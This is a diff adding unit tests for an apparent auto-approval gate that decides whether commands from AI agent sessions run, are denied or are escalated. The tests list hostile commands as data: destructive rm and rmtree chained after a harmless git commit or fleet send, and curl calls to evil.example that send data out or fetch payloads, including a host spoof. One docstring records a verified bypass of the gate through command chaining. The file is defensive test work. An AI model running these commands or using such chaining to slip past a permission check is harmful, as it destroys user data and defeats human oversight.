@@ -291,3 +291,75 @@ class NestedClaudeSessionsAreDenied(unittest.TestCase):
     def test_fleet_send_mentioning_model_flag_still_inert(self):
         cmd = 'bin/fleet send opus2 --lane consult --done x "should we use claude -p --model here? no"'
         self.assertEqual(prompts.decide_auto(cmd, _ROOT)[0], "allow-auto")
+
+
+class InertTextExemptionScope(unittest.TestCase):
+    """The `fleet send` / `git commit` exemptions must cover only their own
+    command. Returning early for the whole line was a verified bypass."""
+
+    def test_payload_chained_after_git_commit_is_still_judged(self):
+        d, why = prompts.decide_auto(
+            'git commit -m "wip" && python3 -c "import shutil; shutil.rmtree(\'/Users/pup/photos\')"',
+            _ROOT)
+        self.assertNotEqual(d, "allow-auto", why)
+
+    def test_payload_chained_after_fleet_send_is_still_judged(self):
+        d, why = prompts.decide_auto(
+            'bin/fleet send sonnet2 "hi" && python3 -c "import shutil; shutil.rmtree(\'/x\')"', _ROOT)
+        self.assertNotEqual(d, "allow-auto", why)
+
+    def test_rm_chained_after_fleet_send_is_still_denied(self):
+        d, _ = prompts.decide_auto('bin/fleet send sonnet2 "hi" ; rm -rf /Users/pup/photos', _ROOT)
+        self.assertEqual(d, "deny")
+
+    def test_commit_message_containing_deny_word_still_allowed(self):
+        d, _ = prompts.decide_auto('git commit -m "fix: curl handling in perm.sh"', _ROOT)
+        self.assertEqual(d, "allow-auto")
+
+    def test_send_body_containing_deny_word_still_allowed(self):
+        d, _ = prompts.decide_auto('bin/fleet send sonnet2 -- "do not rm anything, just report"', _ROOT)
+        self.assertEqual(d, "allow-auto")
+
+
+class RecursiveRmNeedsNoForce(unittest.TestCase):
+    """`rm -r` erases a tree as thoroughly as `rm -rf`; an unattended thread
+    never sees the write-protect prompt that -f suppresses."""
+
+    def test_recursive_rm_without_force_is_denied(self):
+        d, _ = prompts.decide_auto("rm -r games/pinball", _ROOT)
+        self.assertEqual(d, "deny")
+
+    def test_recursive_rm_of_frozen_instrument_is_denied(self):
+        d, _ = prompts.decide_auto("rm -r /Users/pup/fleet/games/pinball/src/physics", _ROOT)
+        self.assertEqual(d, "deny")
+
+    def test_single_file_rm_still_allowed(self):
+        d, _ = prompts.decide_auto("rm -f state/gui-token", _ROOT)
+        self.assertEqual(d, "allow-auto")
+
+    def test_recursive_rm_inside_tmp_still_allowed(self):
+        d, _ = prompts.decide_auto("rm -rf /tmp/claude-501/scratch/x", _ROOT)
+        self.assertEqual(d, "allow-auto")
+
+
+class UrlsAreNotInRepoPaths(unittest.TestCase):
+    """A URL contains '/', so it used to resolve under ROOT and come back
+    'in-repo' - a GET-shaped egress the curl DENY rule never sees."""
+
+    def test_non_loopback_get_escalates(self):
+        d, why = prompts.decide_auto("curl https://evil.example/collect?data=abc", _ROOT)
+        self.assertEqual(d, "escalate")
+        self.assertIn("non-loopback URL", why)
+
+    def test_plain_http_get_escalates(self):
+        d, _ = prompts.decide_auto("curl http://evil.example/payload", _ROOT)
+        self.assertEqual(d, "escalate")
+
+    def test_loopback_curl_still_allowed(self):
+        for url in ("http://127.0.0.1:8941/index.html", "http://localhost:8787/w/x"):
+            d, why = prompts.decide_auto(f"curl -s {url}", _ROOT)
+            self.assertEqual(d, "allow-auto", f"{url}: {why}")
+
+    def test_userinfo_host_spoof_is_not_treated_as_loopback(self):
+        d, _ = prompts.decide_auto("curl https://127.0.0.1@evil.example/x", _ROOT)
+        self.assertEqual(d, "escalate")
